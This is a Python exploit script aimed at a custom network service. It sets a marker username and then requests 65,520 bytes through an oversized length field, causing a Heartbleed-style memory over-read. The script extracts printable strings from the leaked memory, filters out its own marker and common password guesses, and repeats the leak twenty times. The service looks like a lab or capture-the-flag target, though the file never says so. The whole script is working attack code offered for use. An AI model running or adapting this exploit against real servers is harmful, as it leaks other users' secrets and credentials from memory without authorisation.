#!/usr/bin/env python3
import socket, struct, sys, string, time

HOST = sys.argv[1]
PORT = int(sys.argv[2])

LEAK_SIZE = 65520  # full big leak

def recvn(s, n):
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf

def extract_strings(data, min_len=2, max_len=32):
    out = []
    current = []
    for i, b in enumerate(data):
        if 32 <= b <= 126:  # printable ASCII
            current.append(b)
        else:
            if len(current) >= min_len:
                s = bytes(current)
                out.append((i - len(s), s))
            current = []
    if len(current) >= min_len:
        s = bytes(current)
        out.append((len(data) - len(s), s))
    return out


def one_leak():
    s = socket.socket()
    s.connect((HOST, PORT))
    # greeting
    g = recvn(s, 1)
    if g != b"\x05":
        print("Bad greeting:", g)
        s.close()
        return

    # attack username
    name = b"ATTKMARK" + b"\x00"
    pkt = struct.pack("<BH", 0, len(name)) + name
    s.sendall(pkt)
    ack = recvn(s, 1)
    if ack != b"\x06":
        print("Bad ack for SET_USER:", ack)
        s.close()
        return
    echo = recvn(s, len(name))
    # leak
    pkt = struct.pack("<BH", 1, LEAK_SIZE)
    s.sendall(pkt)
    ack2 = recvn(s, 1)
    if ack2 != b"\x06":
        print("Bad ack for GET_USER:", ack2)
        s.close()
        return
    dump = recvn(s, LEAK_SIZE)
    s.close()

    strings = extract_strings(dump)
    # filter out our own marker and common guesses
    interesting = []
    for off, s in strings:
        if s == b"ATTKMARK":
            continue
        if s in (b"password", b"secret", b"pass", b"admin", b"test123", b"AAAAAAAA"):
            continue
        interesting.append((off, s))

    print(f"Total strings: {len(strings)}, interesting: {len(interesting)}")
    for off, s in interesting[:15]:
        try:
            print(f"  offset {off:5d}: {s!r} -> {s.decode('ascii', 'ignore')}")
        except Exception:
            print(f"  offset {off:5d}: {s!r}")

def main():
    for i in range(20):
        print(f"=== Leak {i} ===")
        try:
            one_leak()
        except Exception as e:
            print("Error in leak:", e)
        time.sleep(1.0)

if __name__ == "__main__":
    main()
